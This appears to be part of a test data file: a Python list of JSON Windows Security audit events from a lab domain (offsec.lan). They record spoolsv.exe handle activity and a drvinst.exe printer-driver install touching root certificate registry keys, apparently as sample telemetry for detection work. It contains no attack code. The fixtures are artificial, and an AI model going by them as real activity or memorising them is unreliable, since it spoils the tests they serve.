            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8425888Z", "eventRecordID": "2183523", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1748\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "objectServer": "Security", "handleId": "0x1748", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8426261Z", "eventRecordID": "2183524", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tFile\n\tObject Name:\t\tC:\\Windows\\INF\\TAPISRV\\0409\n\tHandle ID:\t\t0xaf8\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tSYNCHRONIZE\n\t\t\t\tReadData (or ListDirectory)\n\t\t\t\t\n\tAccess Reasons:\t\tSYNCHRONIZE:\tGranted by\tD:(A;;0x1200a9;;;BA)\n\t\t\t\tReadData (or ListDirectory):\tGranted by\tD:(A;;0x1200a9;;;BA)\n\t\t\t\t\n\tAccess Mask:\t\t0x100001\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "objectServer": "Security", "objectType": "File", "objectName": "C:\\Windows\\INF\\TAPISRV\\0409", "handleId": "0xaf8", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1541\n\t\t\t\t%%4416", "accessReason": "%%1541:\t%%1801\tD:(A;;0x1200a9;;;BA)\n\t\t\t\t%%4416:\t%%1801\tD:(A;;0x1200a9;;;BA)", "accessMask": "0x100001", "restrictedSidCount": "0", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8426513Z", "eventRecordID": "2183525", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0xaf8\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "objectServer": "Security", "handleId": "0xaf8", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8426946Z", "eventRecordID": "2183526", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nSource Handle Information:\n\tSource Handle ID:\t0xaf8\n\tSource Process ID:\t0x678\n\nNew Handle Information:\n\tTarget Handle ID:\t0x1748\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "sourceHandleId": "0xaf8", "sourceProcessId": "0x678", "targetHandleId": "0x1748", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8427002Z", "eventRecordID": "2183527", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1748\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "objectServer": "Security", "handleId": "0x1748", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8427193Z", "eventRecordID": "2183528", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tFile\n\tObject Name:\t\tC:\\Windows\\INF\\TAPISRV\\0409\n\tHandle ID:\t\t0xaf8\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tSYNCHRONIZE\n\t\t\t\tReadData (or ListDirectory)\n\t\t\t\t\n\tAccess Reasons:\t\tSYNCHRONIZE:\tGranted by\tD:(A;;0x1200a9;;;BA)\n\t\t\t\tReadData (or ListDirectory):\tGranted by\tD:(A;;0x1200a9;;;BA)\n\t\t\t\t\n\tAccess Mask:\t\t0x100001\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "objectServer": "Security", "objectType": "File", "objectName": "C:\\Windows\\INF\\TAPISRV\\0409", "handleId": "0xaf8", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1541\n\t\t\t\t%%4416", "accessReason": "%%1541:\t%%1801\tD:(A;;0x1200a9;;;BA)\n\t\t\t\t%%4416:\t%%1801\tD:(A;;0x1200a9;;;BA)", "accessMask": "0x100001", "restrictedSidCount": "0", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12800", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8427435Z", "eventRecordID": "2183529", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0xaf8\n\nProcess Information:\n\tProcess ID:\t\t0x678\n\tProcess Name:\t\tC:\\Windows\\System32\\spoolsv.exe"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "objectServer": "Security", "handleId": "0xaf8", "processId": "0x678", "processName": "C:\\Windows\\System32\\spoolsv.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12804", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:14.7662692Z", "eventRecordID": "2183530", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tPlugPlayManager\n\tObject Type:\t\tSecurity\n\tObject Name:\t\tPlugPlaySecurityObject\n\tHandle ID:\t\t0x0\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x280\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tUnknown specific access (bit 1)\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x2\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "PlugPlayManager", "objectType": "Security", "objectName": "PlugPlaySecurityObject", "handleId": "0x0", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1553", "accessMask": "0x2", "restrictedSidCount": "0", "processId": "0x280", "processName": "C:\\Windows\\System32\\svchost.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:14.7846445Z", "eventRecordID": "2183531", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x1dac\n\tNew Process Name:\tC:\\Windows\\System32\\drvinst.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-16384\n\tCreator Process ID:\t0x280\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\n\tProcess Command Line:\tDrvInst.exe \"4\" \"d\" \"C:\\Windows\\system32\\spool\\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\\ntprint.inf\" \"9\" \"4d2985097\" \"0000000000000AEC\" \"WinSta0\\Default\" \"0000000000000D8C\" \"208\" \"C:\\Windows\\system32\\spool\\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "newProcessId": "0x1dac", "newProcessName": "C:\\Windows\\System32\\drvinst.exe", "tokenElevationType": "%%1936", "processId": "0x280", "commandLine": "DrvInst.exe \"4\" \"d\" \"C:\\Windows\\system32\\spool\\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\\ntprint.inf\" \"9\" \"4d2985097\" \"0000000000000AEC\" \"WinSta0\\Default\" \"0000000000000D8C\" \"208\" \"C:\\Windows\\system32\\spool\\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\svchost.exe", "mandatoryLabel": "S-1-16-16384"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1925793Z", "eventRecordID": "2183532", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0x1ac\n\tSource Process ID:\t0x1dac\n\nNew Handle Information:\n\tTarget Handle ID:\t0x1644\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0x1ac", "sourceProcessId": "0x1dac", "targetHandleId": "0x1644", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1925834Z", "eventRecordID": "2183533", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1644\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1644", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1925928Z", "eventRecordID": "2183534", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\n\tHandle ID:\t\t0x1ac\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tDELETE\n\t\t\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tSet key value\n\t\t\t\tCreate sub-key\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x3001F\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "Key", "objectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates", "handleId": "0x1ac", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1537\n\t\t\t\t%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4433\n\t\t\t\t%%4434\n\t\t\t\t%%4435\n\t\t\t\t%%4436", "accessMask": "0x3001f", "restrictedSidCount": "0", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1929381Z", "eventRecordID": "2183535", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1ac\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1ac", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1938486Z", "eventRecordID": "2183536", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0x1b0\n\tSource Process ID:\t0x1dac\n\nNew Handle Information:\n\tTarget Handle ID:\t0x1644\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0x1b0", "sourceProcessId": "0x1dac", "targetHandleId": "0x1644", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1938510Z", "eventRecordID": "2183537", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1644\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1644", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1938598Z", "eventRecordID": "2183538", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\n\tHandle ID:\t\t0x1b0\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe\n\nAccess Request Information:\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\n\tAccesses:\t\tDELETE\n\t\t\t\tREAD_CONTROL\n\t\t\t\tQuery key value\n\t\t\t\tSet key value\n\t\t\t\tCreate sub-key\n\t\t\t\tEnumerate sub-keys\n\t\t\t\tNotify about changes to keys\n\t\t\t\t\n\tAccess Reasons:\t\t-\n\tAccess Mask:\t\t0x3001F\n\tPrivileges Used for Access Check:\t-\n\tRestricted SID Count:\t0"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "objectType": "Key", "objectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates", "handleId": "0x1b0", "transactionId": "{00000000-0000-0000-0000-000000000000}", "accessList": "%%1537\n\t\t\t\t%%1538\n\t\t\t\t%%4432\n\t\t\t\t%%4433\n\t\t\t\t%%4434\n\t\t\t\t%%4435\n\t\t\t\t%%4436", "accessMask": "0x3001f", "restrictedSidCount": "0", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1938677Z", "eventRecordID": "2183539", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1b0\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1b0", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1939982Z", "eventRecordID": "2183540", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nSource Handle Information:\n\tSource Handle ID:\t0x1b4\n\tSource Process ID:\t0x1dac\n\nNew Handle Information:\n\tTarget Handle ID:\t0x1644\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "sourceHandleId": "0x1b4", "sourceProcessId": "0x1dac", "targetHandleId": "0x1644", "targetProcessId": "0x4"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4658", "version": "0", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1939996Z", "eventRecordID": "2183541", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x1644\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess Name:\t\tC:\\Windows\\System32\\drvinst.exe"}, "eventdata": {"subjectUserSid": "S-1-5-18", "subjectUserName": "FS01$", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x3e7", "objectServer": "Security", "handleId": "0x1644", "processId": "0x1dac", "processName": "C:\\Windows\\System32\\drvinst.exe"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4656", "version": "1", "level": "0", "task": "12801", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:15.1940075Z", "eventRecordID": "2183542", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tFS01$\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x3E7\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\n\tHandle ID:\t\t0x1b4\n\tResource Attributes:\t-\n\nProcess Information:\n\tProcess ID:\t\t0x1dac\n\tProcess 